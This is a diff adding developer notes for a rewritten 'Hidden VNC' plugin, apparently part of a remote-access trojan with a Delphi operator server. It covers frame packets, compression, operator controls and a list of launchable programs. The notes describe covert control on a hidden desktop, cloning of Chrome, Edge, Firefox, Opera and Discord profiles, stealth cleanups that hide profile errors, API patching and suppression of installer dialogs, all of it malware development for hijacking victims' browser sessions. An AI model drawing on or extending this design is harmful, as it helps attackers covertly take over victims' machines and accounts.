@@ -1,0 +1,33 @@
+### Hidden VNC Integration & Controller Notes
+
+We have completely rewrote the C++ Hidden VNC Plugin (`client/plugins/HiddenVNCPlugin/main.cpp`) to match almost 100% of the advanced logic, inputs, cloning, and helper patching featured in `VNCFeature.cs`.
+
+#### 1. Integration with Delphi Server (No Designer Changes Required!)
+The rewritten C++ plugin remains **fully compatible** with the current Delphi server's form designer components, lists, and packet handlers in `UnitHiddenVNC.pas` and `ServerManager.pas`.
+- **Frames**: The C++ plugin continues to transmit standard binary packets structured with `THVNCFramePayloadHeader` under packet type `PACKET_TYPE_HVNC_FRAME ($06)`. This is decoded on the server using `ProcessHVNCBinaryFrame`.
+- **LZNT1 Compression**: The custom LZNT1 compressor integrates flawlessly with `RtlDecompressBuffer` loaded dynamically by the Delphi server, reducing bandwidth consumption while ensuring zero GDI/Bitmap overhead.
+- **Controls & Combos**: The action handlers (`hvnc_start`, `hvnc_stop`, `hvnc_quality`, `hvnc_run`) map precisely to the interactive visual elements (Button1, Button2, ComboBox1, ComboBox2, CheckBox1) on `TForm10`.
+- **Progress Logs**: Browser profile cloning progress percentages are reported dynamically as string updates via `hvnc_status` to show the operator real-time feedback (e.g., "Cloning chrome... (45%)") in their server logs.
+
+#### 2. Advanced Control & Reliability Enhancements (All Automatic!)
+- **Smart Window walk**: Instead of the basic `EnumDesktopWindows` blitting, the capturing loop walks top-to-bottom/bottom-to-top Z-order correctly using Win32 API window tree walking (`GetTopWindow` -> `GW_HWNDLAST` -> `GW_HWNDPREV`).
+- **GDI Cache & Blit-less Copy**: Individual windows are cached in per-window DIBSections and scaled directly on the composite DIBSection using hardware-accelerated stretch drawing. This avoids previous GDI memory overheads and freezing.
+- **Stealth & Cleanups**:
+  - Automated SingletonLock, parent.lock, and cookie/socket lock file cleanup.
+  - Verification & self-repair of corrupt Chromium Preferences and Local State files to prevent "profile error" boxes.
+  - Asynchronous background threads for patching Opera's `user32.dll!GetCursorInfo` API and suppressing standard Rundll32 mscories installer dialogs on hidden desktops.
+- **Smart Input**: Improved hit testing (`RefineNCHit`), mouse dragging support, and accurate `ToUnicode` translation with active key state tracking for high-fidelity control.
+
+#### 3. Supported ComboBox Items for Process Launching (ComboBox2)
+The following item names are fully supported and should be added to the Delphi Server's dropdown (ComboBox2 on TForm10) for seamless execution:
+- `cmd.exe`
+- `powershell.exe`
+- `explorer.exe`
+- `Google Chrome` (starts Chrome with custom sandboxed profile)
+- `Microsoft Edge` (starts Edge with custom sandboxed profile)
+- `Firefox` (starts Firefox with custom sandboxed profile)
+- `Waterfox` (starts Waterfox with custom profile)
+- `LibreWolf` (starts LibreWolf with custom profile)
+- `Opera` (starts Opera with custom sandboxed profile)
+- `Opera GX` (starts Opera GX with custom sandboxed profile)
+- `Discord` (starts Discord client)
